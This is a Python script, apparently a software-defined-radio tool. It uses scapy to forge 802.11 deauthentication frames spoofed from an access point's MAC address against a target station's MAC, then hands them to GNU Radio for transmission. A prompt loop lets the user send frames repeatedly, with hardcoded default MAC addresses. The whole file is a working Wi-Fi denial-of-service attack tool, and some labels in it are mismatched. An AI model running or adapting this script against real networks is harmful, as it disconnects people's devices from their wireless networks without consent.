from scapy.all import *
from scapy.layers.dot11 import *


def deassociation_frame(target_mac, ap_mac):
    # Create a deauthentication frame
    frameFCS = ( 
        Dot11FCS(
            proto = 0,
            type=0,
            subtype=12,
            FCfield = None,
            addr1=target_mac,
            addr2=ap_mac,
            addr3=ap_mac,
            SC=(1 << 4)
            ) /
        Dot11Deauth(reason=3)
    )

    print("Generated Deassociation Frame:")
    print(frameFCS.show())

    return bytes(frameFCS) 

def transmitData(packet,host="127.0.0.1",port=52001):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(packet)
        print(f"Sent {len(packet)} byte PV1 Management Action frame to GNU Radio")
    except Exception as e:
        print(f"Socket error: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    print("Deassociation Frame Generator")
    print("=============================")
    print("This script generates a deassociation frame and sends it to GNU Radio for transmission.")
    print("Please ensure that GNU Radio is running and ready to receive frames on the specified port.")
    print("To use this script, enter the mac address of the AP and the STA you want to deauthenticate.")


    while(True):
        print("\nstart deassociation frame generator")
        use_defaults = input("use default values for AP and STA? (y/n): ")
        AP_mac = ""
        STA_mac = ""

        while(use_defaults not in ["y", "n"]):
            use_defaults = input("Invalid input. Please enter 'y' for yes or 'n' for no: ")
        
        if use_defaults == "y":
            AP_mac = "78:72:64:EA:B9:14"
            STA_mac = "3c:22:7f:71:df:d6"    
        elif use_defaults == "n":
            AP_mac = input("Enter the AP MAC address: ")
            STA_mac = input("Enter the STA MAC address: ")
            
        
        raw_frame = deassociation_frame(STA_mac, AP_mac)

        transmitData(raw_frame)
        print(f"Deassociation frame sent to GNU Radio for transmission.")

        print("\nDo you want to send another deassociation frame? (y/n): ")
        continue_choice = input()
        while(continue_choice not in ["y", "n"]):
            continue_choice = input("Invalid input. Please enter 'y' for yes or 'n' for no: ")
        
        if continue_choice == "n":
            print("Exiting the deassociation frame generator.")
            exit(0)
        elif continue_choice == "y":
            continue